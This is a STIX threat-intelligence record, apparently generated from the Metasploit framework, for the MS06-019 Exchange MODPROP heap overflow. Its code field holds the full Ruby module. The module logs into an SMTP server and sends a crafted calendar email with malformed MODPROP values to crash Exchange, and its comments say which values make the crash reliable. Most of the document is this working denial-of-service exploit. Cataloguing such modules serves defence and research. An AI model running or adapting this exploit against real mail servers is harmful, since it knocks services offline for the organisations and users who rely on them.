{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--906e3b97-cd51-48e4-96d8-cb0b92a9ae5b",
    "created": "2024-08-14T16:25:05.20905Z",
    "modified": "2024-08-14T16:25:05.209054Z",
    "name": "MS06-019 Exchange MODPROP Heap Overflow",
    "description": " This module triggers a heap overflow vulnerability in MS Exchange that occurs when multiple malformed MODPROP values occur in a VCAL request. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/windows/smtp/ms06_019_exchange.rb",
            "external_id": "ms06_019_exchange.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-0027"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Smtp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS06-019 Exchange MODPROP Heap Overflow',\n      'Description'    => %q{\n        This module triggers a heap overflow vulnerability in MS\n        Exchange that occurs when multiple malformed MODPROP values\n        occur in a VCAL request.\n      },\n      'Author'         => [ 'pusscat' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'BID', '17908'],\n          [ 'CVE', '2006-0027'],\n          [ 'MSB', 'MS06-019'],\n\n        ],\n      'DisclosureDate' => '2004-11-12'))\n\n    register_options(\n      [\n        OptString.new('SUBJECT', [ true, 'The subject of the e-mail', 're: Your Brains'])\n      ])\n\n  end\n\n  #\n  # This needs some reworking to use the SMTPDeliver mixin and the Re::MIME class\n  #\n  def run\n\n    connect_login\n\n    modprops = ['attendee', 'categories', 'class', 'created', 'description',\n          'dtstamp', 'duration', 'last-modified',\n          'location', 'organizer', 'priority', 'recurrence-id', 'sequence',\n          'status', 'summary', 'transp', 'uid']\n\n    #modprops = ['dtstamp']\n\n    modpropshort =\t\"\"\n    modpropbusted =\t\"\"\n    modnum = rand(3)\n\n    1.upto(modnum) {\n      nextprop = rand(modprops.size)\n      modpropshort << modprops[nextprop] + \",\"\n      modpropbusted << modprops[nextprop].upcase + \":\\r\\n\"\n    }\n\n    modpropshort = \"dtstamp,\"\n    modpropbusted = \"DTSTAMP:\\r\\n\"\n    modnum = modnum + 1 + rand(3)\n    modproplong\t =\tmodpropshort\n    1.upto(modnum) {\n      modproplong << modprops[rand(modprops.size)] + \",\"\n    }\n\n    boundry = Rex::Text.rand_text_alphanumeric(8) + \".\" + Rex::Text.rand_text_alphanumeric(8)\n\n\n    # Really, the randomization above only crashes /sometimes/ - it's MUCH more\n    # reliable, and gives crashes in better spots of you use these modprops:\n\n    modpropshort  = \"dtstamp,\"\n    modproplong   = \"dtstamp, dtstamp,\"\n    modpropbusted = \"DTSTAMP:\\r\\n\"\n\n    mail =\t\t\"From: #{datastore['MAILFROM']}\\r\\n\"\n    mail <<\t\t\"To: #{datastore['MAILTO']}\\r\\n\"\n    mail <<\t\t\"Subject: #{datastore['SUBJECT']}\\r\\n\"\n    mail <<\t\t\"Content-class: urn:content-classes:calendarmessage\\r\\n\"\n    mail <<\t\t\"MIME-Version: 1.0\\r\\n\"\n    mail <<\t\t\"Content-Type: multipart/alternative;boundary=\\\"#{boundry}\\\"\\r\\n\"\n    mail <<\t\t\"X-MimeOLE: Produced By Microsoft Exchange V6.5.7226.0\\r\\n\"\n    mail <<     \"\\r\\n\"\n    mail << \t\"--#{boundry}\\r\\n\"\n    mail <<\t\t\"Content-class: urn:content-classes:calendarmessage\\r\\n\"\n    mail <<\t\t\"Content-Type: text/calendar; method=REQUEST; name=\\\"meeting.ics\\\"\\r\\n\"\n    mail <<\t\t\"Content-Transfer-Encoding: 8bit\\r\\n\"\n    mail <<\t\t\"\\r\\n\"\n    mail <<\t\t\"BEGIN:VCALENDAR\\r\\n\"\n    mail <<\t\t\"BEGIN:VEVENT\\r\\n\"\n    mail <<\t\t\"X-MICROSOFT-CDO-MODPROPS:#{modpropshort.chop}\\r\\n\"\n    mail <<\t\tmodpropbusted\n    mail <<\t\t\"END:VEVENT\\r\\n\"\n    mail <<\t\t\"BEGIN:VEVENT\\r\\n\"\n    mail <<\t\t\"X-MICROSOFT-CDO-MODPROPS:#{modproplong.chop}\\r\\n\"\n    mail <<\t\t\"END:VEVENT\\r\\n\"\n    mail <<\t\t\"END:VCALENDAR\\r\\n\"\n    mail <<\t\t\"\\r\\n--#{boundry}\\r\\n\"\n    mail <<\t\t\"\\r\\n.\\r\\n\"\n\n\n    print_status(\"Sending message...\")\n    sock.put(mail)\n    sock.put(\"QUIT\\r\\n\")\n    print \"<< \" + (sock.get_once || '')\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-11-12"
}